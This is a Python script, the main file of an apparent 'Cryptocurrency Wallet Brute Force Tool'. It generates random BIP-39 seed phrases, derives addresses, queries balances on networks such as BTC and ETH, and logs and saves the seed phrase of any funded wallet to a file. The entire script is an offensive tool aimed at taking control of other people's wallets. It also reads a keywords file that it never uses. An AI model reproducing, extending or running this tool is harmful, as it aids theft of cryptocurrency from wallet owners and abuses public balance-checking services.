#!/usr/bin/env python
"""
Cryptocurrency Wallet Brute Force Tool - Standalone Version
This script generates random BIP-39 seed phrases and checks for balances
across multiple blockchain networks.
"""
import os
import sys
import logging
import threading
import time
import argparse
from datetime import datetime

# Import our modules
from wallet_generator import generate_addresses, validate_mnemonic
from balance_checker import check_balance, format_balance
from config import API_CONFIG

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.StreamHandler(),
        logging.FileHandler("brute_force_log.txt")
    ]
)

# Global variables for the brute force process
running = True
attempts = 0
found_wallets = 0
last_generated = None
last_addresses = None
last_balances = None
stats = {
    "start_time": None,
    "attempts": 0,
    "found": 0,
    "rate": 0
}

def read_keywords(filename):
    """Read BIP-39 keywords from a file."""
    try:
        with open(filename, 'r') as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        logging.error(f"Keywords file '{filename}' not found.")
        return []
    except Exception as e:
        logging.error(f"Error reading keywords file: {str(e)}")
        return []

def save_findings(mnemonic, addresses, balances):
    """Save found wallets with balances to a file."""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    with open("found_wallets.txt", "a") as f:
        f.write(f"=== WALLET FOUND: {timestamp} ===\n")
        f.write(f"Seed phrase: {mnemonic}\n")
        
        for network in addresses.keys():
            f.write(f"{network} Address: {addresses[network]}\n")
            f.write(f"{network} Balance: {balances[network]}\n")
        
        f.write("\n")

def display_stats():
    """Display current statistics."""
    global attempts, found_wallets, stats
    
    if stats["start_time"] is not None:
        elapsed_time = time.time() - stats["start_time"]
        rate = attempts / elapsed_time if elapsed_time > 0 else 0
        stats["rate"] = rate
    
    if found_wallets > 0:
        found_text = f"{found_wallets} WALLETS FOUND! Check found_wallets.txt"
    else:
        found_text = "No wallets with balance found yet"
    
    print(f"\r[{attempts:,} attempts] [Rate: {stats['rate']:.2f}/sec] [{found_text}]", end="")
    sys.stdout.flush()

def brute_force_process(keywords, target_networks, check_interval=1.0, report_interval=10):
    """
    Main brute force function to generate and check wallets.
    
    Args:
        keywords: List of BIP-39 keywords
        target_networks: List of networks to check
        check_interval: Time to wait between API calls
        report_interval: How often to report statistics
    """
    global running, attempts, found_wallets, last_generated, last_addresses, last_balances, stats
    
    try:
        from bip_utils import Bip39MnemonicGenerator, Bip39Languages
    except ImportError:
        logging.error("bip-utils package is required. Install it with: pip install bip-utils")
        return
    
    stats["start_time"] = time.time()
    
    logging.info(f"Starting brute force process for networks: {', '.join(target_networks)}")
    logging.info(f"Loaded {len(keywords)} keywords")
    print(f"Press Ctrl+C to stop the process...")
    
    while running:
        try:
            # Generate a valid BIP-39 mnemonic instead of random words
            mnemonic = Bip39MnemonicGenerator().FromWordsNumber(words_num=12).ToStr()
            last_generated = mnemonic
            
            attempts += 1
            stats["attempts"] = attempts
            
            # Validate the mnemonic
            if not validate_mnemonic(mnemonic):
                continue
            
            # Generate addresses from the mnemonic
            addresses = generate_addresses(mnemonic)
            last_addresses = addresses
            
            if not addresses:
                continue
            
            # Check balances for each network
            balances = {}
            for network in target_networks:
                if network in addresses:
                    balances[network] = check_balance(network, addresses[network])
                    time.sleep(check_interval)  # Avoid rate limiting
            
            last_balances = balances
            
            # Report if any balance is found
            if any(balances.values()):
                found_wallets += 1
                stats["found"] = found_wallets
                
                logging.info("\n" + "="*50)
                logging.info("BALANCE FOUND!")
                logging.info(f"Seed phrase: {mnemonic}")
                
                for net in target_networks:
                    if net in addresses:
                        logging.info(f"{net} Address: {addresses[net]}")
                        balance_formatted = format_balance(net, balances[net])
                        logging.info(f"{net} Balance: {balance_formatted}")
                
                logging.info("="*50)
                
                # Save to file
                save_findings(mnemonic, addresses, balances)
            
            # Update stats periodically
            if attempts % report_interval == 0:
                display_stats()
                
                # Also log stats less frequently
                if attempts % (report_interval * 50) == 0:
                    logging.info(f"Stats: {attempts} attempts, {found_wallets} found, {stats['rate']:.2f} attempts/sec")
        
        except KeyboardInterrupt:
            logging.info("\nStopping brute force process...")
            running = False
            break
        except Exception as e:
            logging.error(f"Error processing wallet: {str(e)}")
            continue

def main():
    """Main function to start the brute force process."""
    parser = argparse.ArgumentParser(description='Cryptocurrency Wallet Brute Force Tool')
    parser.add_argument('--networks', nargs='+', default=['BTC'], 
                        help='Networks to check (e.g., BTC ETH BSC TRX)')
    parser.add_argument('--interval', type=float, default=0.5,
                        help='Time to wait between API calls (default: 0.5)')
    parser.add_argument('--report', type=int, default=10,
                        help='How often to report statistics (default: 10 attempts)')
    
    args = parser.parse_args()
    
    # Validate networks
    available_networks = list(API_CONFIG.keys())
    valid_networks = [n for n in args.networks if n in available_networks]
    
    if not valid_networks:
        print(f"No valid networks selected. Available networks: {', '.join(available_networks)}")
        return
    
    # Read keywords
    keywords = read_keywords('keywords.txt')
    if not keywords:
        print("Failed to read keywords file.")
        return
    
    try:
        brute_force_process(keywords, valid_networks, args.interval, args.report)
    except KeyboardInterrupt:
        print("\nProcess stopped by user.")
    finally:
        if stats["start_time"] is not None:
            elapsed_time = time.time() - stats["start_time"]
            print(f"\nSession summary:")
            print(f"  Total attempts: {attempts:,}")
            print(f"  Wallets found: {found_wallets}")
            print(f"  Average rate: {attempts / elapsed_time:.2f} attempts/sec")
            print(f"  Elapsed time: {elapsed_time:.1f} seconds")
            if found_wallets > 0:
                print(f"  Found wallets saved to: found_wallets.txt")

if __name__ == "__main__":
    main()